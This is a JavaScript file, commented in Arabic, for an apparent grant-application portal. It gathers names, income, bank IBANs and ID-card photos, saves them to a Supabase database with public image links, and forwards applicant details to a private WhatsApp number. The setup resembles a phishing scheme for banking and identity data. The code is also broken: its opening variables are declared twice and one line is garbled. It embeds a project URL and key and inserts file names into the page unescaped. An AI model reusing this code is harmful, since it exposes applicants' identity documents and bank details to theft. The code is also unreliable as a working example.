/* ================================
   PORTAL JAVASCRIPT - FIXED
   ================================ */
// 1. ادرج مفاتيح الربط هنا في أول سطر بالملف
const supabaseUrl = 'https://tdjepjglnyumfdeljhqz.supabase.co'; // رابط مشروعكconst supabaseUrl = 'https://xxxxxxx.supabase.co'; // رابط مشروعك
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRkamVwamdsbnl1bWZkZWxqaHF6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc1MTgzNzYsImV4cCI6MjA5MzA5NDM3Nn0.OUVLxKKjxylaIBR9tGcCPm6g8N5FaCm0gigpNB_Wq3Q'; // مفتاح الـ anon
// تأكد من وجود كلمة createClient بشكل صحيح
const { createClient } = supabase; 
const supabaseClient = createClient(supabaseUrl, supabaseKey);

let currentLanguage = 'ar';
let currentStep = 1;

const formData = {
    personalInfo: {},
    contactCareer: {},
    grantDetails: {},
    bankingInfo: {},
    attachments: {}
};



let currentLanguage = 'ar';
let currentStep = 1;

const formData = {
    personalInfo: {},
    contactCareer: {},
    grantDetails: {},
    bankingInfo: {},
    attachments: {}
};

document.addEventListener('DOMContentLoaded', function() {
    setupLanguageSwitchers();
    setupFormListeners();
    setupFileUpload();
    setupPhoneFormatting();
    setupIBANFormatting();
});

// ================================
// LANGUAGE
// ================================

function setupLanguageSwitchers() {
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            switchLanguage(this.getAttribute('data-lang'));
        });
    });
}

function switchLanguage(lang) {
    currentLanguage = lang;
    document.querySelectorAll('[data-en][data-ar]').forEach(el => {
        const text = lang === 'en' ? el.getAttribute('data-en') : el.getAttribute('data-ar');
        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            el.placeholder = text;
        } else {
            el.textContent = text;
        }
    });
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === 'en' ? 'ltr' : 'rtl';
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.toggle('active', btn.getAttribute('data-lang') === lang);
    });
}

// ================================
// NAVIGATION
// ================================

function nextStep() {
    if (validateStep(currentStep)) {
        saveStepData(currentStep);
        currentStep++;
        updateProgressBar();
        showStep(currentStep);
    }
}

function prevStep() {
    saveStepData(currentStep);
    currentStep--;
    updateProgressBar();
    showStep(currentStep);
}

function showStep(stepNumber) {
    document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
    document.getElementById(`formStep${stepNumber}`).classList.add('active');
    document.querySelector('.portal-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function updateProgressBar() {
    document.getElementById('progressFill').style.width = (currentStep / 5 * 100) + '%';
    for (let i = 1; i <= 5; i++) {
        const el = document.getElementById(`step${i}`);
        el.classList.remove('active', 'completed');
        if (i < currentStep) el.classList.add('completed');
        else if (i === currentStep) el.classList.add('active');
    }
}

// ================================
// VALIDATION
// ================================

function validateStep(stepNumber) {
    let isValid = true;
    const step = document.getElementById(`formStep${stepNumber}`);

    // الحقول العادية
    step.querySelectorAll('[required]').forEach(input => {
        if (input.type === 'file' || input.type === 'checkbox') return;
        if (!validateField(input)) isValid = false;
    });

    // الخطوة 5: الملفات + الشروط
    if (stepNumber === 5) {
        ['idCardFront', 'idCardBack'].forEach(id => {
            const errorEl = document.getElementById(id + 'Error');
            if (!formData.attachments[id]) {
                if (errorEl) errorEl.textContent = currentLanguage === 'ar'
                    ? 'يرجى رفع هذه الصورة'
                    : 'Please upload this photo';
                isValid = false;
            } else {
                if (errorEl) errorEl.textContent = '';
            }
        });

        if (!document.getElementById('terms').checked) {
            isValid = false;
        }
    }

    return isValid;
}

function validateField(field) {
    const value = field.value.trim();
    const errorEl = field.closest('.form-group') && field.closest('.form-group').querySelector('.error-message');
    let isValid = true;
    let msg = '';

    if (!value) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'هذا الحقل مطلوب' : 'This field is required';
    } else if (field.type === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'البريد الإلكتروني غير صحيح' : 'Invalid email';
    } else if (field.name === 'phone' && !/^\+?[0-9\s\-\(\)]{10,20}$/.test(value)) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'رقم الهاتف غير صحيح' : 'Invalid phone number';
    } else if (field.name === 'iban' && !/^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$/.test(value.replace(/\s/g, ''))) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'رقم الآيبان غير صحيح' : 'Invalid IBAN';
    } else if ((field.name === 'grantAmount' || field.name === 'income') && (isNaN(value) || Number(value) <= 0)) {
        isValid = false;
        msg = currentLanguage === 'ar' ? 'يجب أن يكون رقماً موجباً' : 'Must be a positive number';
    }

    field.classList.toggle('error', !isValid);
    if (errorEl) errorEl.textContent = isValid ? '' : msg;
    return isValid;
}

// ================================
// SAVE STEP DATA
// ================================

function saveStepData(stepNumber) {
    const step = document.getElementById(`formStep${stepNumber}`);
    const groups = [null, formData.personalInfo, formData.contactCareer, formData.grantDetails, formData.bankingInfo];
    const group = groups[stepNumber];
    if (!group) return;
    step.querySelectorAll('input, select, textarea').forEach(input => {
        if (input.type === 'file' || input.type === 'checkbox') return;
        if (input.name) group[input.name] = input.value;
    });
}

// ================================
// FILE UPLOAD — الحل النهائي
// ================================

function setupFileUpload() {
    ['idCardFront', 'idCardBack'].forEach(id => {
        const input   = document.getElementById(id);
        const preview = document.getElementById(id + 'Preview');
        const errorEl = document.getElementById(id + 'Error');
        const area    = document.getElementById(id + 'Area');

        if (!input) return;

        // ✅ الحدث الوحيد الذي يعمل بشكل مضمون على كل الأجهزة
        input.addEventListener('change', function() {
            const file = this.files && this.files[0];
            if (!file) return;
            processFile(file, id, input, preview, errorEl, area);
        });

        // Drag & drop للكمبيوتر
        if (area) {
            area.addEventListener('dragover', e => {
                e.preventDefault();
                area.classList.add('drag-over');
            });
            area.addEventListener('dragleave', () => area.classList.remove('drag-over'));
            area.addEventListener('drop', e => {
                e.preventDefault();
                area.classList.remove('drag-over');
                const file = e.dataTransfer.files[0];
                if (file) processFile(file, id, input, preview, errorEl, area);
            });
        }
    });
}

function processFile(file, id, input, preview, errorEl, area) {
    // تحقق من الحجم
    if (file.size > 5 * 1024 * 1024) {
        if (errorEl) errorEl.textContent = currentLanguage === 'ar'
            ? 'حجم الملف أكبر من 5 ميجابايت'
            : 'File size exceeds 5MB';
        input.value = '';
        return;
    }

    // تحقق من النوع — نقبل أيضاً image/* لأن بعض أجهزة الجوال ترسل MIME مختلف
    const allowed = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
    if (!allowed.includes(file.type) && !file.type.startsWith('image/')) {
        if (errorEl) errorEl.textContent = currentLanguage === 'ar'
            ? 'يُسمح فقط بـ JPG أو PNG أو PDF'
            : 'Only JPG, PNG, or PDF allowed';
        input.value = '';
        return;
    }

    // مسح الخطأ
    if (errorEl) errorEl.textContent = '';

    // حفظ الملف
    formData.attachments[id] = file;

    // إظهار Preview
    preview.innerHTML = `
        <i class="fas fa-check-circle" style="color:#27ae60;font-size:1.2rem;flex-shrink:0;"></i>
        <span style="flex:1;word-break:break-all;font-size:0.9rem;">${file.name}</span>
        <button type="button" onclick="removeFile('${id}')" style="background:none;border:none;cursor:pointer;color:#e74c3c;font-size:1.1rem;">
            <i class="fas fa-times"></i>
        </button>
    `;
    preview.style.display = 'flex';
    preview.style.alignItems = 'center';
    preview.style.gap = '0.5rem';
    preview.style.padding = '0.8rem';
    preview.style.background = '#f0fdf4';
    preview.style.borderRadius = '8px';
    preview.style.marginTop = '0.5rem';

    // تغيير لون منطقة الرفع للتأكيد
    if (area) {
        area.style.borderColor = '#27ae60';
        area.style.backgroundColor = 'rgba(39,174,96,0.05)';
    }
}

function removeFile(id) {
    const input   = document.getElementById(id);
    const preview = document.getElementById(id + 'Preview');
    const area    = document.getElementById(id + 'Area');

    if (input) input.value = '';
    if (preview) { preview.style.display = 'none'; preview.innerHTML = ''; }
    if (area) { area.style.borderColor = ''; area.style.backgroundColor = ''; }
    delete formData.attachments[id];
}

// ================================
// FORMATTING
// ================================

function setupPhoneFormatting() {
    var phone = document.getElementById('phone');
    if (!phone) return;
    // نمسح التنسيق التلقائي تماماً — المستخدم يكتب كما يريد
    // التحقق يتم فقط عند الانتقال للخطوة التالية
}

function setupIBANFormatting() {
    const iban = document.getElementById('iban');
    if (!iban) return;
    iban.addEventListener('input', function() {
        let v = this.value.toUpperCase().replace(/\s/g, '');
        if (!v.startsWith('SA')) v = 'SA' + v.replace(/[^0-9]/g, '');
        v = v.slice(0, 24);
        this.value = v.match(/.{1,4}/g)?.join(' ') || v;
    });
}

// ================================
// FORM SUBMISSION
// ================================
function setupFormListeners() {
    var submitBtn = document.getElementById('submitBtn');
    if (!submitBtn) return;

    submitBtn.addEventListener('click', async function() {
        if (!validateStep(5)) return;

        saveStepData(5);

        var txNumber = 'WA-' + new Date().getFullYear() + '-' +
            String(Math.floor(Math.random() * 10000)).padStart(4, '0');

        // أولاً احفظ في Supabase
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';

        await saveToSupabase(txNumber);

        // ثم أظهر النجاح
        document.getElementById('transactionNumber').textContent = txNumber;
        document.getElementById('successModal').classList.add('active');

        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> تقديم الطلب';

        // فتح واتس آب
        var msg = encodeURIComponent(
            'مرحباً، لقد قمت بتقديم طلب منحة.\nرقم المعاملة: ' + txNumber +
            '\nالاسم: ' + (formData.personalInfo.fullName || '') +
            '\nالهاتف: ' + (formData.contactCareer.phone || '') +
            '\nنوع المنحة: ' + (formData.grantDetails.grantType || '') +
            '\nالمبلغ: ' + (formData.grantDetails.grantAmount || '') + ' ريال'
        );
        window.open('https://wa.me/966545239928?text=' + msg, '_blank');
    });
}

function redirectToWhatsApp() {
    document.getElementById('successModal').classList.remove('active');
    document.getElementById('grantForm').reset();
    formData.attachments = {};
    ['idCardFront', 'idCardBack'].forEach(function(id) { removeFile(id); });
    currentStep = 1;
    updateProgressBar();
    showStep(1);
}

// ================================
// SUPABASE (في الخلفية)
// ================================

async function saveToSupabase(txNumber) {
    if (typeof supabase === 'undefined') {
        console.error('❌ Supabase غير معرّف');
        return;
    }

    try {
        // 1. حفظ البيانات أولاً بدون صور
        const appData = {
            full_name:         formData.personalInfo.fullName      || '',
            phone:             formData.contactCareer.phone        || '',
            email:             formData.contactCareer.email        || '',
            country:           formData.personalInfo.country       || '',
            marital_status:    formData.personalInfo.maritalStatus || '',
            num_children:      parseInt(formData.personalInfo.numChildren) || 0,
            profession:        formData.contactCareer.profession   || '',
            monthly_income:    parseInt(formData.contactCareer.income) || 0,
            grant_type:        formData.grantDetails.grantType     || '',
            grant_amount:      parseInt(formData.grantDetails.grantAmount) || 0,
            grant_description: formData.grantDetails.grantDescription || '',
            bank_name:         formData.bankingInfo.bankName       || '',
            account_holder:    formData.bankingInfo.accountHolder  || '',
            iban:              (formData.bankingInfo.iban || '').replace(/\s/g, ''),
            transaction_id:    txNumber,
            status:            'pending',
            created_at:        new Date().toISOString()
        };

        console.log('📤 إرسال البيانات:', appData);

        const { data: insertData, error: insertError } = await supabase
            .from('applications')
            .insert([appData])
            .select();

        if (insertError) {
            console.error('❌ خطأ في الحفظ:', insertError.message);
            return;
        }

        console.log('✅ تم حفظ البيانات بنجاح:', insertData);

        // 2. رفع الصور بشكل منفصل (لا يوقف الحفظ إذا فشل)
        const recordId = insertData[0]?.id;
        for (const [key, label] of [['idCardFront', 'front'], ['idCardBack', 'back']]) {
            const file = formData.attachments[key];
            if (!file) continue;
            try {
                const path = `${txNumber}/${label}_${Date.now()}.${file.name.split('.').pop()}`;
                const { error: uploadError } = await supabase.storage
                    .from('applications')
                    .upload(path, file, { upsert: true });

                if (!uploadError) {
                    const { data: urlData } = supabase.storage
                        .from('applications')
                        .getPublicUrl(path);

                    await supabase
                        .from('applications')
                        .update({ [`id_card_${label}_url`]: urlData.publicUrl })
                        .eq('id', recordId);

                    console.log(`✅ تم رفع صورة ${label}`);
                } else {
                    console.warn(`⚠️ فشل رفع صورة ${label}:`, uploadError.message);
                }
            } catch (imgErr) {
                console.warn(`⚠️ خطأ صورة ${label}:`, imgErr);
            }
        }

    } catch (err) {
        console.error('❌ خطأ عام:', err);
    }
}

// Validation on blur
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('input:not([type=file]), select, textarea').forEach(field => {
        field.addEventListener('blur', function() {
            if (this.hasAttribute('required')) validateField(this);
        });
    });
});
